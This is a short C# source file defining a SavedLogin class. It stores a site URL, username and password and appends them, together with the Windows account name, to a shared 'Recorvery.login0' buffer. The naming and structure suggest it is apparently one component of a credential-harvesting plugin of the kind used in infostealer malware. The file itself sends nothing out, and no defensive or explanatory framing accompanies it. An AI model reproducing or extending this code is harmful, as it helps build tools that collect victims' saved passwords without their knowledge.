using System;

namespace Plugin
{
    internal class SavedLogin
    {
        public string Password;
        public string Url;
        public string Username;

        public SavedLogin(string url, string user, string pass)
        {
            Url = url;
            Username = user;
            Password = pass;
        }

        public void Print()
        {
            var user = Environment.GetEnvironmentVariable("USERNAME");
            Recorvery.login0 += "--- Credential (User: " + user + ") ---";
            Recorvery.login0 += "\n";
            Recorvery.login0 += "URL      : " + Url;
            Recorvery.login0 += "\n";
            Recorvery.login0 += "Username : " + Username;
            Recorvery.login0 += "\n";
            Recorvery.login0 += "Password : " + Password;
            Recorvery.login0 += "\n";
        }
    }
}